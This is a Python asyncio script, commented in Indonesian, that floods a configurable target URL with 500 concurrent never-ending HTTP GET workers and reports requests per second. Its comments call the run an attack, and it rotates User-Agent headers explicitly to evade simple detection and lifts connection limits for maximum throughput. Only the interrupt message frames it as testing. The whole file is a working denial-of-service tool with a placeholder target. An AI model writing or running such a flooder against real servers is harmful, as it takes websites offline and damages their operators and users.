import asyncio
import aiohttp
import random
import time

# --- KONFIGURASI ---
TARGET_URL = "http://127.0.0.1:8080"  # Ganti dengan target Anda
CONCURRENT_REQUESTS = 500             # Jumlah koneksi simultan
TIMEOUT_SECONDS = 5                   # Timeout koneksi

# Daftar User-Agents untuk menghindari deteksi pola sederhana
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
]

async def send_request(session, stats):
    """Fungsi asinkron untuk mengirim satu request HTTP."""
    url = TARGET_URL
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache"
    }
    
    try:
        async with session.get(url, headers=headers, timeout=TIMEOUT_SECONDS) as response:
            # Kita hanya membaca status untuk menghemat bandwidth pengirim
            status = response.status
            stats['success'] += 1
            # stats['codes'][status] = stats['codes'].get(status, 0) + 1
    except Exception as e:
        stats['error'] += 1
    
    # Kontrol kecepatan: jeda sangat kecil untuk mencegah pembengkakan memory
    await asyncio.sleep(0.01)

async def worker(session, stats):
    """Worker yang terus menerus mengirim request."""
    while True:
        await send_request(session, stats)

async def main():
    stats = {'success': 0, 'error': 0}
    print(f"[*] Memulai serangan asinkron ke {TARGET_URL}")
    print(f"[*] Target: {CONCURRENT_REQUESTS} koneksi simultan.")
    
    # Menggunakan TCPConnector dengan limit tinggi untuk performa maksimal
    connector = aiohttp.TCPConnector(limit=None, ttl_dns_cache=300)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        # Membuat pool of workers
        for _ in range(CONCURRENT_REQUESTS):
            task = asyncio.create_task(worker(session, stats))
            tasks.append(task)
        
        # Monitoring sederhana di console
        start_time = time.time()
        while True:
            await asyncio.sleep(2)
            elapsed = time.time() - start_time
            print(f"[+] Stats -> Berhasil: {stats['success']} | Error: {stats['error']} | Elapsed: {elapsed:.2f}s")
            print(f"[!] PPS (Requests per second) estimasi: {stats['success'] / elapsed:.2f}")
            # Reset counter untuk PPS berikutnya
            stats['success'] = 0 

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Pengujian dihentikan oleh pengguna.")
    except Exception as e:
        print(f"\n[!] Error Fatal: {e}")